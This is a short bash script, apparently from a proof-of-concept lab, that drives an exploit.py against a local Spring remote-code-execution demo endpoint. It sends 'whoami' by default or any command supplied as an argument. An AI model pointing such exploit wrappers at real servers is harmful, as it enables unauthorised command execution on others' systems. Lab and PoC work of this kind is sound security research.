#!/bin/bash

if [ $# -eq 0 ]
    then
        python3 exploit.py --url http://localhost:8080/spring-rce-poc/poc?model=test --cmd 'whoami'
        
    else
        python3 exploit.py --url http://localhost:8080/spring-rce-poc/rest-poc?model=test --cmd "$1"
fi

exit 0
